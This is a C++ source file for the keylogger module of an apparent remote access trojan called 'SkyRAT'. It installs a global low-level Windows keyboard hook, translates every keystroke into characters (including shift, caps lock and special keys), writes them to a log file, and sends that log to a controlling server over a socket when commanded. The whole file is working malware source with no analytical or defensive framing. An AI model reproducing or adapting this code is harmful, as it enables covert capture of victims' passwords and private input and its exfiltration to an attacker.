#include "KeyloggerModule.h"
#include "../../Network/MessageProtocol.h"
#include <iostream>
#include <iomanip>
#include <ctime>
#include <chrono>
#include <winsock2.h>

namespace SkyRAT {
namespace Modules {
namespace Implementations {

    // Static instance for hook callback
    KeyloggerModule* KeyloggerModule::s_instance = nullptr;

    KeyloggerModule::KeyloggerModule()
        : m_isRunning(false)
        , m_shouldStop(false)
        , m_keyboardHook(nullptr)
        , m_clientSocket(INVALID_SOCKET)
        , m_logFileName("keylog.txt")
        , m_logger(std::make_shared<Utils::Logger>())
    {
        s_instance = this;
    }

    KeyloggerModule::~KeyloggerModule() {
        shutdown();
        s_instance = nullptr;
    }

    std::string KeyloggerModule::getName() const {
        return "KeyloggerModule";
    }

    std::string KeyloggerModule::getVersion() const {
        return "2.0.0";
    }

    bool KeyloggerModule::initialize() {
        if (!m_logger->initialize("keylogger.log")) {
            return false;
        }
        m_logger->info("Keylogger module initialized");
        return true;
    }

    void KeyloggerModule::shutdown() {
        if (m_isRunning) {
            stop();
        }
        m_logger->info("Keylogger module shut down");
    }

    bool KeyloggerModule::isRunning() const {
        return m_isRunning.load();
    }

    bool KeyloggerModule::start(SOCKET socket) {
        if (m_isRunning) {
            m_logger->warning("Keylogger already running");
            return false;
        }

        m_clientSocket = socket;
        m_shouldStop = false;
        
        try {
            m_keyloggerThread = std::make_unique<std::thread>(&KeyloggerModule::keyloggerThreadFunction, this);
            m_isRunning = true;
            m_logger->info("Keylogger started successfully");
            return true;
        } catch (const std::exception& e) {
            m_logger->error("Failed to start keylogger: " + std::string(e.what()));
            return false;
        }
    }

    bool KeyloggerModule::stop() {
        if (!m_isRunning) {
            return true;
        }

        m_shouldStop = true;
        
        if (m_keyloggerThread && m_keyloggerThread->joinable()) {
            m_keyloggerThread->join();
        }
        
        m_isRunning = false;
        
        // Send log file to server
        bool sent = sendLogFile();
        m_logger->info("Keylogger stopped, log file sent: " + std::string(sent ? "success" : "failed"));
        
        return true;
    }

    bool KeyloggerModule::processCommand(const std::string& command, SOCKET socket) {
        if (command == "START_KEYLOGGER") {
            return start(socket);
        } else if (command == "STOP_KEYLOGGER") {
            return stop();
        }
        return false;
    }

    std::string KeyloggerModule::getStatus() const {
        if (m_isRunning) {
            return "Running - Logging keystrokes to " + m_logFileName;
        }
        return "Stopped";
    }

    bool KeyloggerModule::canHandleCommand(const std::string& command) const {
        return command == "START_KEYLOGGER" || command == "STOP_KEYLOGGER";
    }

    bool KeyloggerModule::executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) {
        return processCommand(command, socket);
    }

    std::vector<std::string> KeyloggerModule::getSupportedCommands() const {
        return {"START_KEYLOGGER", "STOP_KEYLOGGER"};
    }

    void KeyloggerModule::keyloggerThreadFunction() {
        m_logFile = std::make_unique<std::ofstream>(m_logFileName, std::ios::app);
        
        if (!m_logFile->is_open()) {
            m_logger->error("Failed to open log file: " + m_logFileName);
            m_isRunning = false;
            return;
        }

        // Set up the keyboard hook
        m_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(nullptr), 0);
        
        if (!m_keyboardHook) {
            m_logger->error("Failed to install keyboard hook. Error: " + std::to_string(GetLastError()));
            m_isRunning = false;
            return;
        }

        ensureNewlineBeforeAppend(m_logFileName);
        *m_logFile << "=== Keylogger Session Started === " << getCurrentDateTime() << " ===" << std::endl;
        *m_logFile << "Keyboard Layout: " << getKeyboardLayoutName() << std::endl;
        m_logFile->flush();

        // Message loop
        MSG msg;
        while (!m_shouldStop) {
            while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            if (m_shouldStop) {
                break;
            }
            
            Sleep(10);
        }

        // Cleanup
        if (m_keyboardHook) {
            UnhookWindowsHookEx(m_keyboardHook);
            m_keyboardHook = nullptr;
        }
        
        *m_logFile << "\n=== Keylogger Session Ended === " << getCurrentDateTime() << " ===" << std::endl;
        m_logFile->close();
    }

    LRESULT CALLBACK KeyloggerModule::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && s_instance) {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKeyboard->vkCode;

            std::string specialKey = s_instance->logNonPrintableKeys(vkCode);
            if (!specialKey.empty() && specialKey[0] == '[') {
                *s_instance->m_logFile << specialKey;
            } else {
                BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);

                bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool isCapsOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                if (isShiftPressed) keyboardState[VK_SHIFT] |= 0x80;
                if (isCapsOn) keyboardState[VK_CAPITAL] |= 0x01;

                std::string key = s_instance->getActualCharacter(vkCode, keyboardState);
                if (!key.empty()) {
                    *s_instance->m_logFile << key;
                }
            }
            
            s_instance->m_logFile->flush();
        }

        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    std::string KeyloggerModule::getKeyboardLayoutName() {
        HKL layout = GetKeyboardLayout(0);
        LANGID langId = LOWORD(layout);
        
        char layoutName[256];
        if (GetLocaleInfoA(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLANGUAGE, 
                          layoutName, sizeof(layoutName))) {
            return std::string(layoutName);
        }
        return "Unknown";
    }

    std::string KeyloggerModule::getActualCharacter(int vkCode, BYTE keyboardState[256]) {
        HKL keyboardLayout = GetKeyboardLayout(0);
        UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout);

        wchar_t unicodeBuffer[3] = {0};
        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuffer, 2, 0, keyboardLayout);

        if (result > 0) {
            char utf8Buffer[8] = {0};
            int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, result, 
                                                 utf8Buffer, sizeof(utf8Buffer) - 1, nullptr, nullptr);
            if (utf8Length > 0) {
                return std::string(utf8Buffer, utf8Length);
            }
        }

        return "";
    }

    std::string KeyloggerModule::logNonPrintableKeys(int vkCode) {
        switch(vkCode) {
            case VK_BACK: return "[BACKSPACE]";
            case VK_TAB: return "[TAB]";
            case VK_RETURN: return "[ENTER]";
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_PAUSE: return "[PAUSE]";
            case VK_CAPITAL: return "[CAPS_LOCK]";
            case VK_ESCAPE: return "[ESC]";
            case VK_SPACE: return " ";
            case VK_PRIOR: return "[PAGE_UP]";
            case VK_NEXT: return "[PAGE_DOWN]";
            case VK_END: return "[END]";
            case VK_HOME: return "[HOME]";
            case VK_LEFT: return "[ARROW_LEFT]";
            case VK_UP: return "[ARROW_UP]";
            case VK_RIGHT: return "[ARROW_RIGHT]";
            case VK_DOWN: return "[ARROW_DOWN]";
            case VK_INSERT: return "[INSERT]";
            case VK_DELETE: return "[DELETE]";
            case VK_F1: return "[F1]";
            case VK_F2: return "[F2]";
            case VK_F3: return "[F3]";
            case VK_F4: return "[F4]";
            case VK_F5: return "[F5]";
            case VK_F6: return "[F6]";
            case VK_F7: return "[F7]";
            case VK_F8: return "[F8]";
            case VK_F9: return "[F9]";
            case VK_F10: return "[F10]";
            case VK_F11: return "[F11]";
            case VK_F12: return "[F12]";
            case VK_NUMPAD0: return "0";
            case VK_NUMPAD1: return "1";
            case VK_NUMPAD2: return "2";
            case VK_NUMPAD3: return "3";
            case VK_NUMPAD4: return "4";
            case VK_NUMPAD5: return "5";
            case VK_NUMPAD6: return "6";
            case VK_NUMPAD7: return "7";
            case VK_NUMPAD8: return "8";
            case VK_NUMPAD9: return "9";
            case VK_MULTIPLY: return "*";
            case VK_ADD: return "+";
            case VK_SUBTRACT: return "-";
            case VK_DECIMAL: return ".";
            case VK_DIVIDE: return "/";
            default: return "";
        }
    }

    std::string KeyloggerModule::getCurrentDateTime() {
        auto now = std::chrono::system_clock::now();
        std::time_t now_time = std::chrono::system_clock::to_time_t(now);

        std::tm tm_buf;
        localtime_s(&tm_buf, &now_time);

        std::ostringstream oss;
        oss << std::put_time(&tm_buf, "%Y-%m-%d %H:%M:%S");
        return oss.str();
    }

    void KeyloggerModule::ensureNewlineBeforeAppend(const std::string& filename) {
        std::ifstream inFile(filename, std::ios::binary);
        if (!inFile) return;

        inFile.seekg(0, std::ios::end);
        if (inFile.tellg() == 0) return;

        inFile.seekg(-1, std::ios::end); 
        char lastChar;
        inFile.get(lastChar);

        if (lastChar != '\n' && lastChar != '\r') {
            *m_logFile << "\r\n";
        }
    }

    bool KeyloggerModule::sendLogFile() {
        if (m_clientSocket == INVALID_SOCKET) {
            m_logger->error("Invalid socket for sending log file");
            return false;
        }

        try {
            // Use MessageProtocol to send the file
            Network::MessageProtocol protocol;
            
            // Read log file content
            std::ifstream file(m_logFileName, std::ios::binary);
            if (!file.is_open()) {
                m_logger->error("Failed to open log file for sending");
                return false;
            }

            std::string fileContent((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
            file.close();

            if (fileContent.empty()) {
                m_logger->warning("Log file is empty, not sending");
                return true;
            }

            // Create and send message using correct MessageProtocol methods
            std::vector<char> fileContentVector(fileContent.begin(), fileContent.end());
            auto messages = protocol.createFileTransferMessages(m_logFileName, fileContentVector);
            
            // Send all messages via socket
            bool allSent = true;
            for (const auto& message : messages) {
                int sent = send(m_clientSocket, message.data(), static_cast<int>(message.size()), 0);
                if (sent == SOCKET_ERROR) {
                    allSent = false;
                    break;
                }
            }
            
            bool sent = allSent;
            
            if (sent) {
                m_logger->info("Log file sent successfully (" + std::to_string(fileContent.size()) + " bytes)");
            } else {
                m_logger->error("Failed to send log file");
            }
            
            return sent;
        } catch (const std::exception& e) {
            m_logger->error("Exception while sending log file: " + std::string(e.what()));
            return false;
        }
    }

} // namespace Implementations
} // namespace Modules
} // namespace SkyRAT